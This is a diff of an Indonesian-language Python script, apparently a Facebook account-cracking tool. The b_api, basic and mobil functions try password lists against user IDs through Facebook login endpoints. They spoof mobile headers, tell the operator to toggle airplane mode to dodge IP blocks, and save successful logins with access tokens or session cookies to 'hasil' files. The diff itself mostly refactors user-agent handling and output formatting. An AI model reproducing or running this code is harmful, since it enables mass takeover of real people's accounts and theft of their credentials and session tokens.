@@ -59,6 +59,8 @@ def tik():
         sys.stdout.flush();jeda(1)
         
 def folder():
+	try:os.mkdir('hasil')
+	except:pass
 	try:os.mkdir('data')
 	except:pass
 	try:
@@ -418,29 +420,25 @@ class ngentod:
             print("%s [!] Isi yang benar kentod "%(M));self.langsung()
 
     def b_api(self, user, zona):
+    	try:
+    	    ua = open('data/ua.txt', 'r').read()
+        except (KeyError, IOError):
+        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
         global ok,cp,loop
-        print('\r %s*--> %s/%s OK-:%s - CP-:%s '%(P,loop,len(self.id),len(ok),len(cp))),
-        sys.stdout.flush()
         for pw in zona:
             pw = pw.lower()
-            try: os.mkdir('hasil')
-            except: pass
-            try:
-            	ua = open('data/ua.txt', 'r').read()
-            except (KeyError, IOError):
-                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
-            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
-            bapi = 'https://b-api.facebook.com/method/auth.login'
-            params_ = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
-            response = requests.get(bapi, params=params_, headers=headers_)
+            ses = requests.Session()
+            bapi="https://b-api.facebook.com/method/auth.login"
+            header = {"user-agent": ua,"x-fb-connection-bandwidth": str(random.randint(20000,40000)),"x-fb-sim-hni": str(random.randint(20000,40000)),"x-fb-net-hni": str(random.randint(20000,40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
+            response = ses.get(bapi+'?format=json&email=' + user + '&password=' + pw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
             if response.status_code != 200:
             	print ("\r\033[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik"),
                 sys.stdout.flush()
                 loop +=1
                 b_api(self, user, zona)
             if 'session_key' in response.text and 'EAAA' in response.text:
-                print '\r %s*--> %s|%s|%s ' % (H,user,pw,response.json()['access_token'])
-                sv = ' *--> %s|%s|%s'% (user,pw,response.json()['access_token'])
+                print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])
+                sv = ' *--> %s ◊ %s ◊ %s'% (user,pw,response.json()['access_token'])
                 ok.append(sv)
                 open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                 break
@@ -451,8 +449,8 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r %s*--> %s|%s|%s %s %s  ' % (K,user,pw,day,month,year)
-                    sv = ' *--> %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    print '\r %s*--> %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
+                    sv = ' *--> %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year)
                     cp.append(sv)
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                     break
@@ -462,35 +460,33 @@ class ngentod:
                     year  = ''
                 except:
                     pass
-                print '\r %s*--> %s|%s           ' % (K,user,pw)
-                sv = ' *--> %s|%s' % (user,pw)
+                print '\r %s*--> %s ◊ %s           ' % (K,user,pw)
+                sv = ' *--> %s ◊ %s' % (user,pw)
                 cp.append(sv)
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                 break
                 continue
 
         loop += 1
-
-    def basic(self, user, zona):
-        global ok,cp,loop
         print('\r %s*--> %s/%s OK-:%s - CP-:%s '%(P,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
+
+    def basic(self, user, zona):
+        try:
+    	    ua = open('data/ua.txt', 'r').read()
+        except (KeyError, IOError):
+        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
+        global ok,cp,loop
         for pw in zona:
             pw = pw.lower()
-            try: os.mkdir('hasil')
-            except: pass
-            try:
-            	ua = open('data/ua.txt', 'r').read()
-            except (KeyError, IOError):
-                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
             ses = requests.Session()
             ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
             p = ses.get("https://mbasic.facebook.com")
             b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r %s*--> %s|%s|%s  ' % (H,user,pw,kuki)
-                sv = ' *--> %s|%s|%s' % (user,pw,kuki)
+                print '\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
+                sv = ' *--> %s ◊ %s ◊ %s' % (user,pw,kuki)
                 ok.append(sv)
                 open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                 break
@@ -501,8 +497,8 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r %s*--> %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
-                    sv = ' *--> %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
+                    sv = ' *--> %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year)
                     cp.append(sv)
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                     break
@@ -512,27 +508,25 @@ class ngentod:
                     year  = ''
                 except:
                     pass
-                print '\r %s*--> %s|%s            ' % (K,user,pw)
-                sv = ' *--> %s|%s' % (user,pw)
+                print '\r %s*--> %s ◊ %s            ' % (K,user,pw)
+                sv = ' *--> %s ◊ %s' % (user,pw)
                 cp.append(sv)
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                 break
                 continue
 
         loop += 1
-
-    def mobil(self, user, zona):
-        global ok,cp,loop
         print('\r %s*--> %s/%s OK-:%s - CP-:%s '%(P,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
+
+    def mobil(self, user, zona):
+        try:
+    	    ua = open('data/ua.txt', 'r').read()
+        except (KeyError, IOError):
+        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
+        global ok,cp,loop
         for pw in zona:
             pw = pw.lower()
-            try: os.mkdir('hasil')
-            except: pass
-            try:
-            	ua = open('data/ua.txt', 'r').read()
-            except (KeyError, IOError):
-                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
             ses = requests.Session()
             ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
             p = ses.get("https://m.facebook.com")
@@ -555,8 +549,8 @@ class ngentod:
             po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r %s*--> %s|%s|%s ' % (H,user,pw,kuki)
-                sv = ' *--> %s|%s|%s' % (user,pw,kuki)
+                print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,kuki)
+                sv = ' *--> %s ◊ %s ◊ %s' % (user,pw,kuki)
                 ok.append(sv)
                 open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                 break
@@ -567,8 +561,8 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r %s*--> %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
-                    sv = ' *--> %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
+                    sv = ' *--> %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year)
                     cp.append(sv)
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                     break
@@ -578,14 +572,16 @@ class ngentod:
                     year  = ''
                 except:
                     pass
-                print '\r %s*--> %s|%s              ' % (K,user,pw)
-                sv = ' *--> %s|%s' % (user,pw)
+                print '\r %s*--> %s ◊ %s              ' % (K,user,pw)
+                sv = ' *--> %s ◊ %s' % (user,pw)
                 cp.append(sv)
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                 break
                 continue
 
         loop += 1
+        print('\r %s*--> %s/%s OK-:%s - CP-:%s '%(P,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.flush()
         
 # GANTI USER AGENT
 def useragent():
